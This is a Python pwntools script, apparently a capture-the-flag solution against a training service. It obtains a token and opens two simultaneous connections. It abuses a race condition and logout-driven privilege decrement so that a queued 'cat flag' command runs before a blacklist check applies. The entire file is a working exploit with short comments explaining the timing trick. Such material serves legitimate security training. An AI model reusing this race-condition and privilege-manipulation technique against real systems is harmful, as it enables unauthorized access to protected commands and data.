from pwn import *

def get_token(c):
  c.recvuntil(b"token: ")
  return c.recvline().strip()

def create_chain(c, c2, length):
  c.recvuntil(b"\t4 - Execute the command chain\n")
  c.sendline(b'1') 
  for i in range(length):
    c.recvuntil(b'> ')
    c.sendline(b'f') #'f' is the command cat flag
    execute_chain(c2) # I execute the chain with the second terminal before the first has the possibility to enter into blacklist()

def execute_chain(c):
  c.recvuntil(b"\t4 - Execute the command chain\n")
  c.sendline(b'4')
  c.recvline()
  print(c.recvline()) # it prints out the flag
  
# Open the first connection to get the token
c_token = remote("swiss.training.offensivedefensive.it", 8080, ssl=True)
token = get_token(c_token)
c_token.close()

# Open connection 1 to login and logout to put priviledge_level=0
c_1 = remote("private.training.offensivedefensive.it", 8080, ssl=True)
c_1.recvuntil(b"Token: ")
c_1.sendline(token)

# Open connection 2 to logount again and decrease priviledge_level=-1
c_2 = remote("private.training.offensivedefensive.it", 8080, ssl=True)
c_2.recvuntil(b"Token: ")
c_2.sendline(token)

create_chain(c_1, c_2, 1)

